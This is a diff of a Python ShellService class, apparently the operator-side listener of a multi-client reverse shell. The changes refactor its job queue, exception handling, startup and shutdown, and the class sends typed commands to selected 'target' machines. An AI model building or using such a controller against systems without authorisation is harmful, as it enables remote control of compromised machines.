@@ -9,7 +9,7 @@ from queue import Queue
 # Threads for multi-client support
 NUMBER_OF_THREADS = 2
 JOB_NUMBER = [1, 2]
-client_queue = Queue()
+job_queue = Queue()
 
 
 class ShellService:
@@ -122,7 +122,7 @@ class ShellService:
         print('----- Clients -----' + '\n' + results)
 
     def send_target_commands(self, conn):
-        """Send commands to a client machine"""
+        """Handles command input"""
         while True:
             try:
                 cmd = input()
@@ -148,11 +148,11 @@ class ShellService:
                     client_response = self._receive_response(conn)
                     print(client_response, end='')
 
-            except:
+            except Exception:
                 print("[-] Connection lost")
                 break
 
-    def get_connection(self, message):
+    def select_connection(self, message):
         """Select a listed connection"""
 
         # First parse the selection message
@@ -167,7 +167,7 @@ class ShellService:
 
             return conn
 
-        except:
+        except Exception:
             print("[-] Not a valid selection\n")
             return None
 
@@ -189,7 +189,7 @@ class ShellService:
                 break
 
             elif 'select' in cmd:
-                conn = self.get_connection(cmd)
+                conn = self.select_connection(cmd)
 
                 # Send commands if a valid connection was received
                 if conn:
@@ -216,18 +216,19 @@ class ShellService:
             or the transmission of commands to a client.
         """
         while True:
-            job = client_queue.get()
+            job = job_queue.get()
 
             # Handles the acceptance of new connections
             if job == 1:
-                self.setup()
+
+                # Listen for new connections
                 self.accept_connections()
 
             # Handles the transmission of commands
             elif job == 2:
                 self.interactive_prompt()
 
-            client_queue.task_done()
+            job_queue.task_done()
 
     def build_threads(self):
         """Generic function for defining the necessary threads"""
@@ -239,9 +240,9 @@ class ShellService:
     @staticmethod
     def create_jobs():
         for job in JOB_NUMBER:
-            client_queue.put(job)
+            job_queue.put(job)
 
-        client_queue.join()
+        job_queue.join()
 
     def setup(self):
         """Configures the service"""
@@ -251,23 +252,33 @@ class ShellService:
             self.server_socket.bind((self.host, self.port))
             self.server_socket.setblocking(True)
             self.server_socket.listen(5)
+
         except socket.error as msg:
+            # Kill all daemons
             print("[!] Socket creation error: " + str(msg))
+            self.server_socket.close()
             sys.exit()
+
+        print(f"[+] Listening for connections on {self.host} : {self.port}...")
 
     def start(self):
         """Begin running the service"""
-        print(f"[+] Listening for connections on {self.host} : {self.port}...")
-
         # Initiate daemons
+        self.setup()
         self.build_threads()
         self.create_jobs()
 
     def stop(self):
-        # First end all tasks
-        client_queue.task_done()
-        client_queue.task_done()
-
+        print("\n[+] Closing all client connections...")
         self._purge_connections()
+
+        print("[+] Shutting down all tasks...")
+        # First end all tasks
+        job_queue.task_done()
+        job_queue.task_done()
+
+        print("[+] Shutting down shell server...")
         self.server_socket.shutdown(socket.SHUT_RDWR)
         self.server_socket.close()
+        print("[+] Done")
+
